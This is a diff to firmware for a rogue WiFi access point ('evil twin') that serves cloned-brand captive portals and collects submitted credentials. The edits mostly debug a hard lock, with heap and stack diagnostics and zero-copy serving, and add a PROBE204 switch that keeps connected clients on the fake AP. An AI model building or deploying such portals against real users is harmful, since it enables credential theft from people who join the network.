@@ -1,3 +1,4 @@
+#include <FreeRTOS.h>
 #include "vector"
 #include "wifi_conf.h"
 #include "wifi_cust_tx.h"
@@ -55,6 +56,8 @@ enum portals{
 #include "wids.h"
 // M4: raw-lwIP TCP HTTP listener for the WebUI (the Arduino WiFiServer accept is broken on the AP).
 #include "web_lwip.h"
+#include "sp_probe.h"
+
 // Deferred log for the lwIP/tcpip thread (DHCP/DNS must not write the UART directly).
 #include "lwip_log.h"
 #include "petrel_http.h"   // channel validity (host-tested)
@@ -208,7 +211,10 @@ String generateRandomString(int len){
 bool apActive = false;
 
 // Custom portal: HTML streamed from the Flipper (SD file) via PORTALHTML hex chunks.
-static char customPortal[6144];   // BD_RAM_NS is the binding constraint; FAP caps uploads to match
+static char customPortal[6144];
+// TEST 2026-10-28: Default is rebuilt by default_web(String(atSsid)) on EVERY request, inside the
+// tcpip thread. Cache it once per AP start (loop context) so no String work happens per request.
+static const char* g_def_cache = 0;   // BD_RAM_NS is the binding constraint; FAP caps uploads to match
 static volatile uint16_t customPortalLen = 0;
 
 
@@ -2032,6 +2038,7 @@ static bool atStart(int ch = 6, const char* apssid = nullptr, bool portal = fals
     }
     // A real TX channel, else the ch6 default (DFS included: an AP cannot sit on radar channels).
     atChannel = is_valid_tx_channel(ch) ? (uint8_t)ch : 6;
+    g_def_cache = default_web(String(atSsid));   // build the Default page outside the tcpip thread
     // Create AP serves the selected captive portal via the raw-lwIP listener; the bare test AP serves
     // the read-only status page via the raw-lwIP WebUI. The Arduino WiFiServer is not used at all, so
     // the "[ERROR] Accept connection failed" flood is gone. Set per start; the next start overwrites
@@ -2234,25 +2241,26 @@ static void webui_render(char* b, size_t n) {
 // bytes for the raw-lwIP captive-portal listener. Brand pages are gzip blobs in flash (streamed
 // zero-copy); Custom is the mutable customPortal buffer (streamed with COPY); Default is built from
 // the clone SSID. gzip is detected from the magic.
+
 static void resolve_eviltwin_portal(const char** body, int* len, bool* gzip, bool* copy) {
   const char* b; int l; bool cp = false;
   switch ((enum portals)portal) {
 #ifdef PETREL_BRAND_PORTALS   // real-brand pages: private overlay only; else these fall to Default
-    // 2026-10-28: these were streamed zero-copy straight out of flash. Serving the 39 KB Facebook
-    // blob that way hard-locked the board (loop() stopped, AP died, phone lost the netif) while the
-    // 3.4 KB plain Default page was stable. Queued with COPY instead; the blob is small enough that
-    // the extra pbuf copy is cheap next to a dead AP.
-    case Facebook:  b = (const char*)facebook;  l = facebook_len;  cp = true; break;
-    case Amazon:    b = (const char*)amazon;    l = amazon_len;    cp = true; break;
-    case Apple:     b = (const char*)apple;     l = apple_len;     cp = true; break;
-    case Google:    b = (const char*)google;    l = google_len;    cp = true; break;
-    case Microsoft: b = (const char*)microsoft; l = microsoft_len; cp = true; break;
+    // 2026-10-28: served zero-copy. This core gives lwIP a ~7 KB heap (MEM_SIZE) and its malloc
+    // failure hook disables interrupts and spins forever, so a COPY of a multi-KB body can kill the
+    // board outright. Zero-copy hands lwIP the flash pointer: segments only, no body in the heap.
+    // Safe because web_resolve_now() only re-resolves while nothing is streaming (g_sends == 0).
+    case Facebook:  b = (const char*)facebook;  l = facebook_len;  break;
+    case Amazon:    b = (const char*)amazon;    l = amazon_len;    break;
+    case Apple:     b = (const char*)apple;     l = apple_len;     break;
+    case Google:    b = (const char*)google;    l = google_len;    break;
+    case Microsoft: b = (const char*)microsoft; l = microsoft_len; break;
 #endif
     case Custom:    b = customPortal; l = customPortalLen; cp = true; break;   // mutable -> COPY
     case Default:
-    default:        // current AP ssid. default_web() returns a static String's buffer; it is
-                    // streamed with COPY so a rebuild cannot free it under an in-flight send.
-                    b = default_web(String(atSsid)); l = (int)strlen(b); cp = true; break;
+    default:        // cached at AP start; see g_def_cache
+                    if (!g_def_cache) g_def_cache = default_web(String(atSsid));
+                    b = g_def_cache; l = (int)strlen(b); cp = true; break;
   }
   *body = b; *len = l; *copy = cp;
   *gzip = (l >= 2 && (uint8_t)b[0] == 0x1f && (uint8_t)b[1] == 0x8b);
@@ -2522,6 +2530,25 @@ void destroyAP()
 }
 
 void loop() {
+  // DIAG (2026-10-28): the board hard-locks while serving a portal page. Codex's leading theory is
+  // tcpip-task stack exhaustion hitting this core's fatal overflow hook (which spins forever). The
+  // hook lives in a prebuilt archive, so measure the task instead: print its stack high-water mark
+  // and the FreeRTOS heap once a second. The last line before a lock shows the trend.
+  {
+    static uint32_t diag_ms = 0;
+    if((uint32_t)(millis() - diag_ms) >= 1000u) {
+      diag_ms = millis();
+      char db[112];
+      web_lwip_diag_tick();
+      { extern volatile unsigned g_dns_stage, g_dhcp_stage, g_dns_sz;
+      snprintf(db, sizeof(db), "DIAG h=%u s=%u n=%u t=%u p=%u b=%u d=%u hc=%u z=%u q=%u",
+               (unsigned)xPortGetFreeHeapSize(), web_lwip_stage(), web_lwip_reqs(), web_lwip_ticks(),
+               (unsigned)g_sp_min, (unsigned)g_sp_base,
+               (unsigned)g_dns_stage, (unsigned)g_dhcp_stage, (unsigned)g_dns_sz,
+               web_lwip_pcb_state()); }
+      Serial.println(db);
+    }
+  }
   framer_drain();   // M0.2: flush any queued sniff frames to CH340 first (lowest latency)
   if (wids_on) wids_drain();   // M3: emit queued WIDS alerts (cb cannot touch Serial)
   if (web_portal_mode) {   // drain captive-portal credentials captured in the lwIP recv thread
@@ -2570,11 +2597,13 @@ void loop() {
       // next command parse — the first newline would hand the chain "garbage+SCAN" and match
       // nothing. Re-arm the peripheral AND drop the stale bytes.
       link_rearmed = true;
-      Serial1.end();
-      Serial1.begin(BAUD);
+      // TEST 2026-10-28: the halt always lands 4-5 s after this re-arm, so the re-init itself is
+      // the suspect. Log it, do not tear the peripheral down.
+      // Serial1.end();
+      // Serial1.begin(BAUD);
       cmdFlip = "";
       cmdUsb = "";
-      Serial.println("LINK:Serial1 re-armed after idle");
+      Serial.println("LINK:rearm-skipped (self-heal disabled for test)");
     }
   }
   // Process EVERY complete line, in order, from both sources (USB first: the out-of-band control
@@ -2792,6 +2821,13 @@ void loop() {
       ssid = readString.substring(6,readString.length()-1);
       DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
        
+    }else if(readString.substring(0,8)=="PROBE204"){
+      // Bench switch: "PROBE204 1" makes every OS connectivity probe answer 204 before a
+      // submission, so a client that insists on internet validation stays on the AP while the
+      // portal is being exercised. Default (and "PROBE204 0") is the real captive behaviour.
+      String v = readString.substring(8); v.trim();
+      web_lwip_set_probe204(v.toInt() != 0);
+      atReply(v.toInt() != 0 ? "PROBE204:on" : "PROBE204:off");
     }else if(readString.substring(0,7)=="APSTART"){
       // Create AP: bring up an OPEN AP + the selected captive portal via the cooperative FSM.
       // atStart(..., portal=true) keeps loop() responsive: petrel_ap_begin supports 2.4 AND non-DFS
